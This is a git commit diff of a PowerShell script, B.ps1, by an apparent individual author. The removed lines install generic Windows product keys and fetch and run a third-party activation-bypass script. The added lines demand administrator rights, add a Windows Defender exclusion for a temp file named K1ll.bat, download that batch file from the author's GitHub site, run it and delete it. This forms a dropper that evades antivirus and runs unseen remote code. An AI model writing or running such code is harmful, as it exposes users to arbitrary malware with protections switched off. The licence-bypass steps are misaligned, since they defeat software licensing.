19774b4ba22703381ad8d236619554796eb90e36
al0nks1337 <al0nks1337@gmail.com>
2025-04-27 16:06:29 +0000

    Update B.ps1

--- B.ps1
+++ B.ps1
@@ -1,9 +1,14 @@
 Clear-Host
-Start-Process -FilePath "changepk.exe" -ArgumentList "/ProductKey NPPR9-FWDCX-D2C8J-H872K-2YT43" -NoNewWindow -Wait
-cscript.exe //nologo slmgr.vbs /ipk CPWHC-NT2C7-VYW78-DHDB2-PG3GK *> $null
-$temp = [System.IO.Path]::GetTempPath()
-$masPath = Join-Path -Path $temp -ChildPath "MAS_AIO.cmd"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/massgravel/Microsoft-Activation-Scripts/refs/heads/master/MAS/All-In-One-Version-KL/MAS_AIO.cmd" -OutFile $masPath
-Start-Process -FilePath $masPath -ArgumentList "/HWID" -Wait
-Remove-Item -Path $masPath -Force
-Exit
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Error "Run as administrator!"
+    exit 1
+}
+ 
+$batPath = "$env:TEMP\K1ll.bat"
+New-Item -Path $batPath -ItemType File -Force | Out-Null
+ 
+Add-MpPreference -ExclusionPath $batPath  -ErrorAction SilentlyContinue | Out-Null
+ 
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/al0nks1337/al0nks1337.github.io/refs/heads/main/K1ll.bat" -OutFile $batPath
+Start-Process -FilePath $batPath -Wait | Out-Null
+Remove-Item -Path $batPath -Force -ErrorAction SilentlyContinue
